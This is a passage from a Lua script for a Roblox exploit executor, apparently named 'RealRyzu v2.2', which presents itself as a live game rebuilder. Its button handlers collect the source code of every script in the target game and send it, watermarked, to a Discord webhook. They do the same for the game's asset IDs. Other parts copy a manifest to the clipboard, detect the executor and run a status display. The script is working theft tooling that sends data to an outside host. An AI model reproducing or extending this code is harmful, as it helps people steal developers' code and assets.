    if DiscordExfil.WebhookURL=="" then Log("Set webhook first!", Color3.fromRGB(255,190,55)); return end
    Log("Starting exfiltration...", Color3.fromRGB(255,190,55))
    task.spawn(function()
        for _, t in ipairs(CLONE_TARGETS) do
            for _, obj in ipairs(t.Source:GetDescendants()) do
                if not GameRebuilder.IsRunning then break end
                if obj:IsA("Script") or obj:IsA("LocalScript") or obj:IsA("ModuleScript") then
                    local s=""; pcall(function() s=obj.Source end)
                    if s~="" then
                        DiscordExfil:SendLarge(RYZU_WATERMARK.."\n"..s, obj.Name..".lua")
                        ExfilStats.Text=string.format("Chunks: %d | Data: %.1f KB",DiscordExfil.ChunksSent,DiscordExfil.TotalBytesSent/1024)
                        task.wait(0.3)
                    end
                end
            end
        end
        Log("Exfiltration complete!", Color3.fromRGB(150,255,150))
    end)
end)

ExfilAssetsBtn.MouseButton1Click:Connect(function()
    if DiscordExfil.WebhookURL=="" then Log("Set webhook first!", Color3.fromRGB(255,190,55)); return end
    local urls={}
    for _, t in ipairs(CLONE_TARGETS) do
        for _, obj in ipairs(t.Source:GetDescendants()) do
            local id=nil
            pcall(function() id=obj.MeshId or obj.SoundId or obj.Texture or obj.Image or obj.AnimationId or obj.Video end)
            if id and tostring(id):match("rbxassetid://(%d+)") then table.insert(urls, tostring(id)) end
        end
    end
    DiscordExfil:SendLarge("RealRyzu Assets\n"..#urls.." total\n\n"..table.concat(urls,"\n"), "asset_urls.txt")
    Log("Assets exfiltrated!", Color3.fromRGB(150,255,150))
end)

ExportAllBtn.MouseButton1Click:Connect(function()
    local m = VirtualFS:GetManifest()
    pcall(function() setclipboard(m) end)
    Log("Manifest exported!", Color3.fromRGB(150,255,150))
end)

ClearBtn.MouseButton1Click:Connect(function()
    VirtualFS.Root={}; VirtualFS.TotalFiles=0; VirtualFS.TotalBytes=0; VirtualFS.FileList={}
    Log("Cache cleared", Color3.fromRGB(255,185,105))
end)

-- ═══════════════════════════════════════════════════════════════════════
-- INIT
-- ═══════════════════════════════════════════════════════════════════════
local execName, execScore = ExecutorDetector:Detect()
ExecLabel.Text = "Executor: " .. execName
ExecNameLabel.Text = "Detected: " .. execName
ExecConfLabel.Text = "Confidence: " .. string.format("%.1f", execScore)

pcall(function()
    local info = MarketplaceService:GetProductInfo(game.PlaceId)
    if info and info.Name then GameLabel.Text = "Game: " .. info.Name end
end)

UpdatePages()

Log("RealRyzu v2.2 loaded — LIVE GAME REBUILDER", Color3.fromRGB(0, 245, 255))
Log("Executor: " .. execName, Color3.fromRGB(110, 215, 110))
Log("Clones into REAL services — game runs on play", Color3.fromRGB(110, 230, 110))
Log("Scripts execute, GUIs appear, paths resolve", Color3.fromRGB(110, 230, 110))
Log("All output watermarked — RealRyzu Development", Color3.fromRGB(0, 205, 245))
Log("discord.gg/realryzu", Color3.fromRGB(0, 200, 250))
Log("Ready — press REBUILD GAME to begin", Color3.fromRGB(150, 255, 150))

task.spawn(function()
    while ScreenGui and ScreenGui.Parent do
        if GameRebuilder.IsRunning then
            local elapsed = tick() - (GameRebuilder.Stats.StartTime or tick())
            RuntimeLabel.Text = string.format("Runtime: %.1fs | Files: %d | Size: %.1f KB",
                elapsed, VirtualFS.TotalFiles, VirtualFS.TotalBytes/1024)
        end
        task.wait(0.3)
    end
end)

UserInputService.InputBegan:Connect(function(input, gpe)
    if gpe then return end
    if input.KeyCode == Enum.KeyCode.Delete then
        if GameRebuilder.IsRunning then GameRebuilder.CancelRequested = true
        else ScreenGui:Destroy() end
    end
end)
